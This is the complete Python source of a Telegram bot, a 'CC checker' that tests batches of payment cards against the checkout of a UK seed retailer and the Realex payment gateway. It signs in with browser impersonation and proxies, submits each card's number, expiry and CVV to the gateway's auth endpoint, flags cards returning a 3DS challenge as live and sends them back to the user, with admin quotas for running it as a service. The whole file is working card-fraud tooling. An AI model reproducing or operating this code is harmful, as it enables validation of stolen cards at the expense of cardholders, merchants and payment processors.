# -*- coding: utf-8 -*-
"""
DOBIES CC Checker — Telegram Bot
"""
import asyncio
import logging
import os
import re
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

from curl_cffi import requests as curl_requests
import requests
from dotenv import load_dotenv
import admin_panel
import database as db
import i18n
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

load_dotenv()

# ========== CONFIGURATION ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
LOGIN_EMAIL = os.getenv("LOGIN_EMAIL", "")
LOGIN_PASSWORD = os.getenv("LOGIN_PASSWORD", "")
PROXY_URL = os.getenv("PROXY_URL", "").strip()
IMPERSONATE = os.getenv("CURL_IMPERSONATE", "chrome120")

LOGGED_IN_MARKERS = (
    "my account", "sign out", "log out", "account-management",
    "welcome back", "your orders", "sign-out",
)

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ========== CONSTANTS ==========
CARD_PATTERN = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
DOBIES_BASE = "https://www.dobies.co.uk"
REALEX_BASE = "https://pay.realexpayments.com/hosted-payments/blue"

CHECKOUT_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "ar,en-US;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "referer": "https://pay.realexpayments.com/",
    "upgrade-insecure-requests": "1",
    "user-agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
    ),
}

BASE_HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://pay.realexpayments.com",
    "User-Agent": CHECKOUT_HEADERS["user-agent"],
    "X-Requested-With": "XMLHttpRequest",
}

# ========== SESSION ==========
dobies_session = None
user_sessions: dict = {}


def mask_card(card: str) -> str:
    parts = card.split("|")
    if len(parts) != 4:
        return card[:6] + "****" if len(card) > 6 else card
    cc, mm, yy, cvv = parts
    masked_cc = cc[:6] + "*" * max(0, len(cc) - 10) + cc[-4:] if len(cc) >= 10 else cc
    return f"{masked_cc}|{mm}|{yy}|***"


def format_elapsed(seconds: int) -> str:
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"


def track_user(update: Update) -> None:
    user = update.effective_user
    if user:
        db.upsert_user(user.id, user.username, user.first_name, user.last_name)


def user_can_check(user_id: int, cards_count: int = 0) -> tuple[bool, str]:
    if admin_panel.is_admin(user_id):
        return True, ""
    ok, err, kw = db.check_access(user_id, cards_count)
    if ok:
        return True, ""
    if err == "custom":
        return False, kw["msg"]
    if err == "banned" and not kw.get("reason"):
        kw["reason"] = i18n.t(user_id, "ban_default_reason")
    return False, i18n.t(user_id, f"err_{err}", **kw)


def get_max_cards(user_id: int) -> int:
    if admin_panel.is_admin(user_id):
        return int(db.get_setting("global_max_cards", "100"))
    return db.get_user_limits(user_id)[0]


def get_card_delay(user_id: int) -> float:
    if admin_panel.is_admin(user_id):
        return float(db.get_setting("global_delay", "1.0"))
    return db.get_user_limits(user_id)[1]


def get_active_sessions() -> dict:
    result = {}
    for uid, stats in user_sessions.items():
        if stats.get("is_running"):
            user = db.get_user(uid) or {}
            result[uid] = {
                "checked": stats["cards_checked"],
                "total": stats["total"],
                "name": user.get("first_name") or str(uid),
            }
    return result


def stop_user_check(user_id: int) -> None:
    stats = get_user_stats(user_id)
    if stats.get("is_running"):
        stats["is_running"] = False
        stats["last_response"] = "stopped_admin"


def stop_all_checks() -> int:
    n = 0
    for uid in list(user_sessions.keys()):
        if user_sessions[uid].get("is_running"):
            stop_user_check(uid)
            n += 1
    return n


def parse_cards(text: str) -> tuple[list[str], list[str]]:
    """يرجع (كروت صالحة، أسطر مرفوضة)"""
    valid, invalid = [], []
    seen = set()
    for line in text.strip().splitlines():
        card = line.strip()
        if not card or card.startswith("#"):
            continue
        if not CARD_PATTERN.match(card):
            invalid.append(card)
            continue
        if card in seen:
            continue
        seen.add(card)
        valid.append(card)
    return valid, invalid


def get_user_stats(user_id: int) -> dict:
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            "total": 0,
            "checking": 0,
            "success_3ds": 0,
            "failed": 0,
            "errors": 0,
            "start_time": None,
            "is_running": False,
            "dashboard_message_id": None,
            "chat_id": None,
            "current_card": "",
            "last_response": "waiting",
            "cards_checked": 0,
            "success_cards": [],
        }
    return user_sessions[user_id]


def reset_user_stats(user_id: int) -> None:
    if user_id in user_sessions:
        user_sessions[user_id].update({
            "total": 0,
            "checking": 0,
            "success_3ds": 0,
            "failed": 0,
            "errors": 0,
            "start_time": None,
            "is_running": False,
            "current_card": "",
            "last_response": "waiting",
            "cards_checked": 0,
            "success_cards": [],
        })


def base_card_data(cc: str, guid: str) -> dict:
    return {
        "pas_cctype": "MC",
        "pas_pareq": "", "pas_acsurl": "", "pas_termurl": "",
        "encryptMD": "", "verifyMessage": "", "verifyResult": "", "verifyEnrolled": "",
        "pas_ccnum": cc,
        "cardIdentifyError": "",
        "pas_expiry": "", "pas_cccvc": "", "pas_issuenumber": "", "pas_ccname": "",
        "guid": guid,
        "dccchoice": "", "dccrate": "",
        "hppInstallmentPlanId": "", "hppInstallmentTcVersion": "", "hppInstallmentTcLang": "",
    }


# ========== AUTO LOGIN ==========
def _new_session() -> curl_requests.Session:
    kwargs: dict = {"impersonate": IMPERSONATE}
    if PROXY_URL:
        kwargs["proxies"] = {"http": PROXY_URL, "https": PROXY_URL}
    return curl_requests.Session(**kwargs)


def _browser_headers(referer: str | None = None) -> dict:
    hdrs = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-GB,en;q=0.9",
        "user-agent": CHECKOUT_HEADERS["user-agent"],
    }
    if referer:
        hdrs["referer"] = referer
    return hdrs


def _parse_hidden_fields(html: str) -> dict:
    fields: dict[str, str] = {}
    for tag in re.findall(r"<input[^>]+>", html, re.I):
        if 'type="hidden"' not in tag.lower() and "type='hidden'" not in tag.lower():
            continue
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        if not name_m:
            continue
        val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
        fields[name_m.group(1)] = val_m.group(1) if val_m else ""
    return fields


def _is_logged_in(html: str, url: str = "") -> bool:
    low = html.lower()
    if any(marker in low for marker in LOGGED_IN_MARKERS):
        return True
    if url and "sign-in" not in url.lower() and "account" in url.lower():
        return True
    return False


def _fetch_checkout_guid(session: curl_requests.Session) -> str | None:
    resp = session.get(
        f"{DOBIES_BASE}/checkout/delivery",
        headers={
            **_browser_headers(f"{DOBIES_BASE}/"),
            "cache-control": "max-age=0",
            "upgrade-insecure-requests": "1",
        },
        timeout=30,
    )
    match = re.search(r"card\.html\?guid=([\w-]+)", resp.text)
    if match:
        return match.group(1)
    log.warning(
        "GUID not in checkout page — status=%s len=%d",
        resp.status_code,
        len(resp.text),
    )
    return None


def do_login() -> bool:
    global dobies_session
    if not LOGIN_EMAIL or not LOGIN_PASSWORD:
        log.error("LOGIN_EMAIL أو LOGIN_PASSWORD غير مضبوطين في المتغيرات")
        return False

    log.info("جاري تسجيل الدخول... (proxy=%s)", "yes" if PROXY_URL else "no")
    session = _new_session()
    base_hdrs = _browser_headers()

    try:
        session.get(DOBIES_BASE + "/", headers=base_hdrs, timeout=30)
        time.sleep(1)

        sign_in_url = f"{DOBIES_BASE}/sign-in"
        sign_in_page = session.get(
            sign_in_url,
            headers=_browser_headers(DOBIES_BASE + "/"),
            timeout=30,
        )
        time.sleep(0.5)

        if sign_in_page.status_code >= 400:
            log.error("sign-in page HTTP %s", sign_in_page.status_code)
            return False

        form_data = _parse_hidden_fields(sign_in_page.text)
        form_data.update({
            "EmailAddress": LOGIN_EMAIL,
            "Password": LOGIN_PASSWORD,
        })

        login_resp = session.post(
            sign_in_url,
            headers={
                **_browser_headers(sign_in_url),
                "content-type": "application/x-www-form-urlencoded",
                "origin": DOBIES_BASE,
            },
            data=form_data,
            allow_redirects=True,
            timeout=30,
        )
        time.sleep(1)

        account = session.get(
            f"{DOBIES_BASE}/account-management",
            headers=_browser_headers(sign_in_url),
            timeout=30,
        )

        if not _is_logged_in(account.text, str(account.url)):
            snippet = re.sub(r"\s+", " ", account.text[:300])
            log.error(
                "فشل تسجيل الدخول — status=%s url=%s snippet=%s",
                account.status_code,
                account.url,
                snippet[:200],
            )
            if "captcha" in account.text.lower() or "cloudflare" in account.text.lower():
                log.error("الموقع يطلب CAPTCHA/Cloudflare — جرّب PROXY_URL على Railway")
            return False

        log.info("جاري إضافة منتج للسلة...")
        session.post(
            f"{DOBIES_BASE}/cart-JSON.cfm",
            headers={
                **_browser_headers(f"{DOBIES_BASE}/SUSGW2/peony-pink-hawaiian-coral_mh-76854"),
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
            },
            data=(
                "Quantity=1&addtobasket=1&prodcode=MH322"
                "&name=Carrot+'Autumn+King+2'+-+Seeds&sku=433811"
            ),
            timeout=30,
        )

        dobies_session = session
        log.info("تسجيل الدخول ناجح — cookies=%d", len(session.cookies))
        return True

    except Exception as exc:
        log.exception("خطأ في اللوجين: %s", exc)
        return False


def ensure_session() -> curl_requests.Session | None:
    global dobies_session
    if dobies_session is None and not do_login():
        return None
    return dobies_session


async def get_guid_with_retry(loop, stats: dict, max_retries: int = 3) -> str | None:
    for attempt in range(max_retries):
        session = await loop.run_in_executor(None, ensure_session)
        if not session:
            log.warning("لا توجد جلسة — محاولة %d/%d", attempt + 1, max_retries)
            stats["last_response"] = f"guid_retry:{attempt + 1}"
            await asyncio.sleep(2)
            continue

        guid = await loop.run_in_executor(None, lambda s=session: _fetch_checkout_guid(s))
        if guid:
            return guid

        log.warning("فشل جلب GUID — محاولة %d/%d", attempt + 1, max_retries)
        stats["last_response"] = f"guid_retry:{attempt + 1}"
        global dobies_session
        dobies_session = None
        await loop.run_in_executor(None, do_login)
        await asyncio.sleep(2)

    return None


# ========== CARD CHECKER ==========
async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
    stats = get_user_stats(user_id)
    if not stats["is_running"]:
        return card, "STOPPED"

    parts = card.strip().split("|")
    if len(parts) != 4:
        stats["errors"] += 1
        return card, "ERROR"

    cc, mm, yy, cvv = parts
    yy2 = yy[-2:]
    mmyy = f"{mm}/{yy2}"
    stats["current_card"] = mask_card(card)

    try:
        loop = asyncio.get_running_loop()

        guid = await get_guid_with_retry(loop, stats)
        if not guid:
            stats["errors"] += 1
            stats["last_response"] = "guid_error"
            return card, "ERROR"

        referer = f"{REALEX_BASE}/card.html?guid={guid}"
        hdrs = {**BASE_HEADERS, "Referer": referer}

        await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/3ds2/verifyEnrolled",
                headers=hdrs, data=base_card_data(cc, guid), timeout=20,
            ),
        )
        await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/api/cardIdentification",
                headers=hdrs, data=base_card_data(cc, guid), timeout=20,
            ),
        )

        auth_data = {
            **base_card_data(cc, guid),
            "pas_expiry": mmyy,
            "pas_cccvc": cvv,
            "pas_ccname": "John Smith",
            "browserJavaEnabled": "false",
            "browserLanguage": "ar",
            "screenColorDepth": "24",
            "screenHeight": "786",
            "screenWidth": "1397",
            "timezoneUtcOffset": "-120",
            "paymentFormHeight": "660",
            "paymentFormWidth": "600",
        }

        resp_auth = await loop.run_in_executor(
            None,
            lambda: requests.post(
                f"{REALEX_BASE}/api/auth",
                headers=hdrs, data=auth_data, timeout=30,
            ),
        )
        data = resp_auth.json()

        encoded_creq = (data.get("data") or {}).get("verifyEnrolledResult") or {}
        if encoded_creq.get("encodedCreq"):
            stats["success_3ds"] += 1
            stats["success_cards"].append(card)
            stats["last_response"] = "3d_live"
            await send_result(bot_app, card, "3D", user_id)
            return card, "3D"

        result_code = (data.get("data") or {}).get("response") or {}
        code = result_code.get("result", data.get("status", "?"))
        stats["failed"] += 1
        stats["last_response"] = f"decline:{code}"
        return card, "DECLINE"

    except Exception as exc:
        stats["errors"] += 1
        stats["last_response"] = f"error:{str(exc)[:35]}"
        return card, "ERROR"


async def send_result(bot_app, card: str, status_type: str, user_id: int) -> None:
    stats = get_user_stats(user_id)
    if status_type != "3D":
        return

    text = (
        f"{i18n.t(user_id, 'result_3d_title')}\n\n"
        f"💳 `{card}`\n\n"
        f"{i18n.t(user_id, 'result_3d_status')}\n"
        f"📊 {stats['cards_checked']}/{stats['total']}"
    )
    await bot_app.bot.send_message(
        chat_id=stats["chat_id"],
        text=text,
        parse_mode="Markdown",
    )


# ========== DASHBOARD ==========
def _btn(text: str, callback: str = "noop", style: str | None = None) -> InlineKeyboardButton:
    kwargs: dict = {"text": text, "callback_data": callback}
    if style:
        kwargs["api_kwargs"] = {"style": style}
    return InlineKeyboardButton(**kwargs)


def _url_btn(text: str, url: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text, url=url)


def build_welcome_text(user_id: int) -> str:
    mx = get_max_cards(user_id)
    return (
        f"{i18n.t(user_id, 'welcome_title')}\n\n"
        f"{i18n.t(user_id, 'welcome_about')}\n\n"
        f"{i18n.t(user_id, 'welcome_body', max=mx)}\n\n"
        f"{i18n.t(user_id, 'links_block')}"
    )


def _dash_status(user_id: int, stats: dict) -> tuple[str, str]:
    if stats["last_response"] == "completed":
        return i18n.t(user_id, "status_completed"), "success"
    if stats["last_response"] in ("stopped", "stopped_admin"):
        return i18n.format_status(user_id, stats["last_response"]), "danger"
    if stats["is_running"]:
        return i18n.t(user_id, "status_running"), "success"
    return i18n.t(user_id, "status_waiting"), "primary"


def build_dashboard_text(user_id: int) -> str:
    return i18n.t(user_id, "dash_title")


def create_dashboard_keyboard(user_id: int) -> InlineKeyboardMarkup:
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats["start_time"]:
        elapsed = int((datetime.now() - stats["start_time"]).total_seconds())

    progress = (stats["cards_checked"] / stats["total"] * 100) if stats["total"] else 0
    speed = (stats["cards_checked"] / elapsed * 60) if elapsed > 0 else 0
    status_text, status_style = _dash_status(user_id, stats)
    last_disp = i18n.format_status(user_id, stats["last_response"])

    rows = [
        [_btn(status_text, style=status_style)],
        [_btn(i18n.t(user_id, "btn_total", n=stats["total"]), style="primary")],
        [_btn(i18n.t(user_id, "btn_progress", done=stats["cards_checked"], total=stats["total"], pct=f"{progress:.0f}"), style="primary")],
        [
            _btn(f"⏱ {format_elapsed(elapsed)}", style="primary"),
            _btn(i18n.t(user_id, "btn_speed", speed=f"{speed:.1f}"), style="primary"),
        ],
        [
            _btn(i18n.t(user_id, "btn_3ds", n=stats["success_3ds"]), style="success"),
            _btn(i18n.t(user_id, "btn_decline", n=stats["failed"]), style="danger"),
        ],
        [_btn(i18n.t(user_id, "btn_errors", n=stats["errors"]), style="danger")],
        [_btn(f"📡 {last_disp[:50]}", style="primary")],
    ]

    if stats["current_card"]:
        rows.append([_btn(f"🔍 {stats['current_card']}", style="primary")])

    if stats["is_running"]:
        rows.append([_btn(i18n.t(user_id, "btn_stop"), "stop_check", "danger")])
    else:
        rows.append([_btn(i18n.t(user_id, "btn_send_file"), style="success")])

    rows.append([
        _btn(i18n.t(user_id, "btn_refresh"), "refresh_dash", "primary"),
        _btn(i18n.t(user_id, "btn_reload"), "reload_session", "primary"),
    ])

    return InlineKeyboardMarkup(rows)


async def update_dashboard(bot_app, user_id: int) -> None:
    stats = get_user_stats(user_id)
    if not stats["dashboard_message_id"] or not stats["chat_id"]:
        return
    try:
        await bot_app.bot.edit_message_text(
            chat_id=stats["chat_id"],
            message_id=stats["dashboard_message_id"],
            text=build_dashboard_text(user_id),
            reply_markup=create_dashboard_keyboard(user_id),
            parse_mode="Markdown",
        )
    except BadRequest:
        pass
    except Exception:
        pass


def language_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            _btn("🇸🇦 العربية", "lang:ar", "primary"),
            _btn("🇬🇧 English", "lang:en", "primary"),
        ],
    ])


def settings_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [_btn(i18n.t(user_id, "settings_lang", lang=i18n.lang_label(user_id)), "noop", "primary")],
        [
            _btn(i18n.t(user_id, "btn_lang_ar"), "lang:ar", "success"),
            _btn(i18n.t(user_id, "btn_lang_en"), "lang:en", "success"),
        ],
        [_btn(i18n.t(user_id, "btn_back"), "back_menu", "primary")],
    ])


def main_menu_keyboard(user_id: int) -> InlineKeyboardMarkup:
    rows = [
        [
            _btn(i18n.t(user_id, "btn_help"), "help", "primary"),
            _btn(i18n.t(user_id, "btn_status"), "refresh_dash", "primary"),
        ],
        [
            _btn(i18n.t(user_id, "btn_reload"), "reload_session", "success"),
            _btn(i18n.t(user_id, "btn_settings"), "settings", "primary"),
        ],
    ]
    if admin_panel.is_admin(user_id):
        rows.append([_btn(i18n.t(user_id, "btn_admin"), "adm:main", "danger")])
    rows.append([
        _url_btn(i18n.t(user_id, "btn_channel"), i18n.LINK_CHANNEL),
        _url_btn(i18n.t(user_id, "btn_owner"), i18n.LINK_OWNER),
    ])
    rows.append([_url_btn(i18n.t(user_id, "btn_chat"), i18n.LINK_CHAT)])
    return InlineKeyboardMarkup(rows)


async def show_language_picker(update: Update) -> None:
    await update.effective_message.reply_text(
        i18n.TEXTS["ar"]["choose_language"],
        reply_markup=language_keyboard(),
        parse_mode="Markdown",
    )


async def show_main_menu(update: Update, user_id: int) -> None:
    await update.effective_message.reply_text(
        build_welcome_text(user_id),
        reply_markup=main_menu_keyboard(user_id),
        parse_mode="Markdown",
        disable_web_page_preview=True,
    )


def limit_cards(cards: list[str], user_id: int) -> tuple[list[str], int]:
    max_cards = get_max_cards(user_id)
    if len(cards) <= max_cards:
        return cards, 0
    return cards[:max_cards], len(cards) - max_cards


# ========== PROCESS CARDS ==========
async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
    stats = get_user_stats(user_id)

    for card in cards:
        if not stats["is_running"]:
            break

        stats["current_card"] = mask_card(card)
        stats["checking"] = 1
        await update_dashboard(bot_app, user_id)
        await check_card(card, bot_app, user_id)
        stats["cards_checked"] += 1
        stats["checking"] = 0
        stats["current_card"] = ""
        await update_dashboard(bot_app, user_id)

        if stats["is_running"] and stats["cards_checked"] < stats["total"]:
            await asyncio.sleep(get_card_delay(user_id))

    was_stopped = stats["cards_checked"] < stats["total"]
    db.record_session(
        user_id,
        stats["cards_checked"],
        stats["success_3ds"],
        stats["failed"],
        stats["errors"],
    )
    stats["is_running"] = False
    stats["checking"] = 0
    stats["current_card"] = ""
    stats["last_response"] = "stopped" if was_stopped else "completed"
    await update_dashboard(bot_app, user_id)

    elapsed = int((datetime.now() - stats["start_time"]).total_seconds()) if stats["start_time"] else 0
    title = i18n.t(user_id, "summary_stopped" if was_stopped else "summary_done")
    summary = (
        f"*{title}*\n\n"
        f"{i18n.t(user_id, 'summary_total', n=stats['total'])}\n"
        f"{i18n.t(user_id, 'summary_3ds', n=stats['success_3ds'])}\n"
        f"{i18n.t(user_id, 'summary_decline', n=stats['failed'])}\n"
        f"{i18n.t(user_id, 'summary_errors', n=stats['errors'])}\n"
        f"{i18n.t(user_id, 'summary_time', t=format_elapsed(elapsed))}"
    )
    await bot_app.bot.send_message(
        chat_id=stats["chat_id"],
        text=summary,
        reply_markup=InlineKeyboardMarkup([
            [
                _btn(i18n.t(user_id, "btn_3ds", n=stats["success_3ds"]), style="success"),
                _btn(i18n.t(user_id, "btn_decline", n=stats["failed"]), style="danger"),
            ],
            [_btn(i18n.t(user_id, "btn_errors", n=stats["errors"]), style="danger")],
        ]),
        parse_mode="Markdown",
    )

    if stats["success_cards"]:
        success_text = "\n".join(stats["success_cards"])
        filename = Path(f"3ds_{user_id}_{int(datetime.now().timestamp())}.txt")
        filename.write_text(success_text, encoding="utf-8")
        try:
            with filename.open("rb") as doc:
                await bot_app.bot.send_document(
                    chat_id=stats["chat_id"],
                    document=doc,
                    caption=i18n.t(user_id, "result_3d_file", n=len(stats["success_cards"])),
                    parse_mode="Markdown",
                )
        finally:
            filename.unlink(missing_ok=True)


async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list[str]) -> None:
    user_id = update.effective_user.id
    track_user(update)
    stats = get_user_stats(user_id)

    allowed, reason = user_can_check(user_id, len(cards))
    if not allowed:
        await update.effective_message.reply_text(reason, parse_mode="Markdown")
        return

    if stats["is_running"]:
        await update.effective_message.reply_text(
            i18n.t(user_id, "checking_now"),
            parse_mode="Markdown",
        )
        return

    cards, skipped = limit_cards(cards, user_id)
    if skipped:
        await update.effective_message.reply_text(
            i18n.t(user_id, "max_trimmed", max=get_max_cards(user_id), skipped=skipped),
            parse_mode="Markdown",
        )

    reset_user_stats(user_id)
    stats.update({
        "total": len(cards),
        "start_time": datetime.now(),
        "is_running": True,
        "chat_id": update.effective_chat.id,
    })

    dashboard_msg = await update.effective_message.reply_text(
        build_dashboard_text(user_id),
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode="Markdown",
    )
    stats["dashboard_message_id"] = dashboard_msg.message_id
    asyncio.create_task(process_cards(cards, context.application, user_id))


# ========== TELEGRAM HANDLERS ==========
def build_help_text(user_id: int) -> str:
    mx = db.get_setting("global_max_cards", "100")
    return i18n.t(user_id, "help", max=mx)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    track_user(update)
    uid = update.effective_user.id
    if not i18n.has_language(uid):
        await show_language_picker(update)
        return
    await show_main_menu(update, uid)


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    track_user(update)
    uid = update.effective_user.id
    if not i18n.has_language(uid):
        await show_language_picker(update)
        return
    await update.message.reply_text(build_help_text(uid), parse_mode="Markdown")


async def settings_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    track_user(update)
    uid = update.effective_user.id
    if not i18n.has_language(uid):
        await show_language_picker(update)
        return
    await update.message.reply_text(
        f"{i18n.t(uid, 'settings_title')}\n\n{i18n.t(uid, 'settings_lang', lang=i18n.lang_label(uid))}",
        reply_markup=settings_keyboard(uid),
        parse_mode="Markdown",
    )


async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await admin_panel.admin_cmd(update, context, get_active_sessions)


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not i18n.has_language(user_id):
        await show_language_picker(update)
        return
    stats = get_user_stats(user_id)
    if stats["dashboard_message_id"]:
        await update_dashboard(context.application, user_id)
        await update.message.reply_text(i18n.t(user_id, "dash_updated"))
    else:
        await update.message.reply_text(
            build_dashboard_text(user_id),
            reply_markup=create_dashboard_keyboard(user_id),
            parse_mode="Markdown",
        )


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await stop_check(update.effective_user.id, context.application, update.effective_chat.id)


async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    msg = await update.message.reply_text(i18n.t(uid, "reloading"))
    ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
    text = i18n.t(uid, "reload_ok") if ok else i18n.t(uid, "reload_fail")
    await msg.edit_text(text)


async def stop_check(user_id: int, bot_app, chat_id: int) -> None:
    stats = get_user_stats(user_id)
    if not stats["is_running"]:
        await bot_app.bot.send_message(chat_id=chat_id, text=i18n.t(user_id, "no_active_check"))
        return
    stats["is_running"] = False
    stats["last_response"] = "stopped"
    await update_dashboard(bot_app, user_id)
    await bot_app.bot.send_message(
        chat_id=chat_id,
        text=i18n.t(user_id, "check_stopped"),
        parse_mode="Markdown",
    )


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    track_user(update)
    uid = update.effective_user.id
    if not i18n.has_language(uid):
        await show_language_picker(update)
        return
    allowed, reason = user_can_check(uid)
    if not allowed:
        await update.message.reply_text(reason, parse_mode="Markdown")
        return

    file = await update.message.document.get_file()
    content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
    valid, invalid = parse_cards(content)

    if not valid:
        await update.message.reply_text(i18n.t(uid, "empty_file"), parse_mode="Markdown")
        return

    note = i18n.t(uid, "invalid_lines", n=len(invalid)) if invalid else ""

    await update.message.reply_text(
        i18n.t(uid, "file_loaded", n=len(valid), note=note),
        parse_mode="Markdown",
    )
    await start_check(update, context, valid)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not update.message or not update.message.text:
        return

    if await admin_panel.handle_admin_input(update, context, context.application):
        return

    track_user(update)
    uid = update.effective_user.id
    if not i18n.has_language(uid):
        await show_language_picker(update)
        return
    allowed, reason = user_can_check(uid)
    if not allowed:
        await update.message.reply_text(reason, parse_mode="Markdown")
        return

    valid, invalid = parse_cards(update.message.text)
    if not valid:
        return

    note = i18n.t(uid, "ignore_lines", n=len(invalid)) if invalid else ""
    await update.message.reply_text(
        i18n.t(uid, "cards_ready", n=len(valid), note=note),
        parse_mode="Markdown",
    )
    await start_check(update, context, valid)


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    if data == "noop":
        await query.answer()
        return

    if data.startswith("adm:"):
        await admin_panel.admin_callback(
            update, context, get_active_sessions, stop_user_check, stop_all_checks,
        )
        return

    if data.startswith("lang:"):
        lang = data.split(":")[1]
        if lang in i18n.LANGS:
            first_time = not i18n.has_language(user_id)
            db.set_user_language(user_id, lang)
            track_user(update)
            await query.answer()
            confirm = i18n.t(user_id, "language_set_ar" if lang == "ar" else "language_set_en")
            if first_time:
                await query.edit_message_text(confirm, parse_mode="Markdown")
                await show_main_menu(update, user_id)
            else:
                await query.edit_message_text(
                    f"{confirm}\n\n{i18n.t(user_id, 'settings_title')}\n"
                    f"{i18n.t(user_id, 'settings_lang', lang=i18n.lang_label(user_id))}",
                    reply_markup=settings_keyboard(user_id),
                    parse_mode="Markdown",
                )
        return

    if data == "settings":
        await query.answer()
        await query.edit_message_text(
            f"{i18n.t(user_id, 'settings_title')}\n\n{i18n.t(user_id, 'settings_lang', lang=i18n.lang_label(user_id))}",
            reply_markup=settings_keyboard(user_id),
            parse_mode="Markdown",
        )
        return

    if data == "back_menu":
        await query.answer()
        await query.edit_message_text(
            build_welcome_text(user_id),
            reply_markup=main_menu_keyboard(user_id),
            parse_mode="Markdown",
            disable_web_page_preview=True,
        )
        return

    if data == "help":
        await query.answer()
        await query.message.reply_text(build_help_text(user_id), parse_mode="Markdown")
        return

    if data == "refresh_dash":
        await query.answer(i18n.t(user_id, "refresh_ok"))
        await update_dashboard(context.application, user_id)
        return

    if data == "reload_session":
        await query.answer(i18n.t(user_id, "reloading_short"))
        ok = await asyncio.get_running_loop().run_in_executor(None, do_login)
        await query.message.reply_text(
            i18n.t(user_id, "reload_ok") if ok else i18n.t(user_id, "reload_fail")
        )
        return

    if data == "stop_check":
        await query.answer(i18n.t(user_id, "stopping"))
        stats = get_user_stats(user_id)
        await stop_check(user_id, context.application, stats["chat_id"] or query.message.chat_id)
        return

    await query.answer()


def validate_config() -> bool:
    missing = []
    if not BOT_TOKEN:
        missing.append("BOT_TOKEN")
    if not LOGIN_EMAIL:
        missing.append("LOGIN_EMAIL")
    if not LOGIN_PASSWORD:
        missing.append("LOGIN_PASSWORD")
    if missing:
        log.error("متغيرات البيئة ناقصة: %s", ", ".join(missing))
        return False
    return True


class _HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, _format, *_args):
        pass


def start_health_server() -> None:
    port = os.getenv("PORT")
    if not port:
        return
    server = HTTPServer(("0.0.0.0", int(port)), _HealthHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log.info("Health check على المنفذ %s", port)


def main() -> None:
    if not validate_config():
        raise SystemExit(1)

    start_health_server()
    db.init_db()
    log.info("الأدمن: %s", admin_panel.ADMIN_IDS)

    log.info("جاري تسجيل الدخول الأولي...")
    if not do_login():
        log.warning("فشل اللوجين الأولي — سيُعاد المحاولة أثناء الفحص")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("reload", reload_cmd))
    app.add_handler(CommandHandler("settings", settings_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(button_callback))

    log.info("البوت شغال — فحص تسلسلي")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
